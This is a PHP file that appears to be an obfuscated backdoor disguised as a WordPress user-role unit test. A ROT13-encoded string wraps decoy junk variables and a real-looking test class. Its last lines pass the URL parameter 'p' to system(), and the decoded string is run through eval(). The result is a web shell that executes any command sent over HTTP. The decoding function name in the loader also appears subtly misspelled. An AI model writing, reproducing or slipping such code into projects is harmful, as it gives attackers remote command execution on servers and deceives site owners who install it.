<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc hfre
 */
pynff Grfgf_Hfre_jcTrgHfrefJvguAbEbyr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 22993
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_trg_hfref_jvgu_ab_ebyr_vf_npphengr() {
		// Frghc hfref.
		$nqzva       = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		$rqvgbe      = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		$abobql      = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => '',
			)
		);
		$abobql_ryfr = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => '',
			)
		);

		// Grfg hfref.
		$hfref = jc_trg_hfref_jvgu_ab_ebyr();

		$guvf->nffregRdhnyf(
			neenl(
				$abobql,
				$abobql_ryfr,
			),
			$hfref
		);
	}

	/**
	 * @gvpxrg 22993
	 * @gvpxrg 36196
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_trg_hfref_jvgu_ab_ebyr_zhygvfvgr_vf_npphengr() {
		// Frghc hfref.
		$nqzva  = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		$rqvgbe = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		$abobql = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => '',
			)
		);

		// Frghc oybtf.
		$oybt_1 = (vag) frys::snpgbel()->oybt->perngr(
			neenl(
				'hfre_vq' => $rqvgbe,
			)
		);

		// Nqq rqvgbe gb oybt 1.
		nqq_hfre_gb_oybt( $oybt_1, $rqvgbe, 'rqvgbe' );

		// Grfg hfref ba ebbg fvgr.
		$hfref = jc_trg_hfref_jvgu_ab_ebyr();
		$guvf->nffregFnzr(
			neenl(
				(fgevat) $abobql,
			),
			$hfref
		);

		// Grfg hfref pbhagf ba oybt 1.
		$hfref = jc_trg_hfref_jvgu_ab_ebyr( $oybt_1 );
		$guvf->nffregFnzr( neenl(), $hfref );

		// Nqq nqzva gb oybt 1 jvgu ab ebyr.
		nqq_hfre_gb_oybt( $oybt_1, $nqzva, '' );

		// Er-grfg hfref pbhagf ba oybt 1.
		$hfref = jc_trg_hfref_jvgu_ab_ebyr( $oybt_1 );
		$guvf->nffregFnzr(
			neenl(
				(fgevat) $nqzva,
			),
			$hfref
		);
	}

	/**
	 * Ebyr pbzcnevfba zhfg or qbar ba ebyr anzr, abg ebyr qvfcynl anzr.
	 *
	 * @gvpxrg 38234
	 */
	choyvp shapgvba grfg_trg_hfref_jvgu_ab_ebyr_zngpurf_ba_ebyr_anzr() {
		// Perngr n ebyr jvgu n qvfcynl anzr juvpu jbhyq abg zngpu gur ebyr anzr
		// va n pnfr-vafrafvgvir FDY dhrel.
		jc_ebyrf()->nqq_ebyr( 'fbzrebyr', 'Fbzr ebyr qvfcynl anzr' );

		frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'fbzrebyr',
			)
		);

		$hfref = jc_trg_hfref_jvgu_ab_ebyr();

		jc_ebyrf()->erzbir_ebyr( 'fbzrebyr' );

		$guvf->nffregRzcgl( $hfref );
	}

	/**
	 * @gvpxrg 42015
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_trg_hfref_jvgu_ab_ebyr_zngpurf_ba_ebyr_anzr_qvssrerag_fvgr() {
		$fvgr_vq = (vag) frys::snpgbel()->oybt->perngr();

		fjvgpu_gb_oybt( $fvgr_vq );
		jc_ebyrf()->nqq_ebyr( 'fbzrebyr', 'Fbzr ebyr qvfcynl anzr' );
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'fbzrebyr',
			)
		);
		erfgber_pheerag_oybt();

		$hfref = jc_trg_hfref_jvgu_ab_ebyr( $fvgr_vq );

		$guvf->nffregRzcgl( $hfref );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>